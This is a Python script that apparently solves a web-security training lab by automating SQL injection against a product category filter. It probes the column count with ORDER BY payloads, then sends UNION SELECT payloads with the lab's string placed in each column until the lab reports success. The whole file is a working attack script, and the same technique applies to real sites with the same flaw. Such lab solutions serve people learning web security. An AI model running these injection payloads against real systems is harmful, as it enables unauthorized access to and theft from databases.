import requests
from colorama import Fore, Style, init
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.lab_string = None
        self.number_of_columns = None

    def get_lab_string(self):
        response = self.session.get(self.lab_url)
        self.lab_string = re.findall('Make the database retrieve the string: \'(.*)\'', response.text)[0]

    def check_number_of_columns(self):
        payload = 'filter?category=Lifestyle\' ORDER BY {}--'
        for i in range(10):
            temp_payload = payload.format(i+1)
            response = self.session.get(self.lab_url + temp_payload)
            if response.status_code == 200:
                print(Fore.RED + '[-]' + Style.RESET_ALL + ' ORDER BY ' + str(i+1))
            else:
                print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' ORDER BY ' + str(i + 1))
                self.number_of_columns = i
                break

    def inject_lab_string_in_suitable_column_position(self):
        nulls = ''
        for i in range(self.number_of_columns):
            nulls += 'NULL, '
        payload = 'filter?category=Lifestyle\' UNION SELECT {}'.format(nulls).rstrip(', ') + '--'
        payloads = []
        matches = list(re.finditer('NULL', payload))
        for match in matches:
            start, end = match.span()
            payloads.append(payload[:start] + '\'{}\''.format(self.lab_string) + payload[end:])
        for p in payloads:
            response = self.session.get(self.lab_url + p)
            if response.status_code == 200:
                print(Fore.GREEN + '[+]' + Style.RESET_ALL + ' ' + p)
                break
            else:
                print(Fore.RED + '[-]' + Style.RESET_ALL + ' ' + p)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_lab_string()
        self.check_number_of_columns()
        self.inject_lab_string_in_suitable_column_position()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
